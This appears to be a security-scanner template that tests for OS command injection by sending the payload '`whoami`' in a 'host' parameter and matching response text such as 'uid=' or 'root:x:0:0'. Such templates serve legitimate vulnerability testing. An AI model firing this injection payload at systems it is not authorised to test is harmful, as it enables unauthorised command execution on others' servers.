id: cmdi6-0430
name: 'Shell injection in host'
severity: critical
type: active
tags:
  - cmdi
  - injection
  - rce
description: 'OS command runs via host'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      host:
        - '`whoami`'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'root:x:0:0'
          - 'www-data'
